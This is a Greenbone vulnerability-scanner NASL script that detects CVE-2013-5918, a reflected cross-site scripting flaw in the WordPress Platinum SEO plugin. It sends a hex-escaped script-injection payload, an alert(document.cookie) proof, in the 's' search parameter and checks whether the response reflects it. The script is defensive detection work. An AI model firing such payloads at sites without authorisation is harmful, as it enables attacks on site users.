# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804020");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2013-5918");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62692");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2013-09-27 18:05:55 +0530 (Fri, 27 Sep 2013)");
  script_name("WordPress Platinum SEO Plugin < 1.3.8 XSS Vulnerability");

  script_tag(name:"summary", value:"The WordPress plugin 'Platinum SEO' is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able to read the
cookie or not.");
  script_tag(name:"solution", value:"Update to version 1.3.8 or later.");
  script_tag(name:"insight", value:"Input passed via the 's' parameter to platinum_seo_pack.php script is
not properly sanitized before being returned to the user.");
  script_tag(name:"affected", value:"WordPress Platinum SEO Plugin version 1.3.7 and prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/?s=\\x3C\\x2F\\x74\\x69\\x74\\x6C\\x65\\x3E\\x3C\\x73\\x63' +
            '\\x72\\x69\\x70\\x74\\x3E\\x61\\x6C\\x65\\x72\\x74\\x28\\x64' +
            '\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74\\x2E\\x63\\x6F\\x6F\\x6B' +
            '\\x69\\x65\\x29\\x3C\\x2F\\x73\\x63\\x72\\x69\\x70\\x74\\x3E';

## Extra check is not possible
if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document\.cookie\)</script>"))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
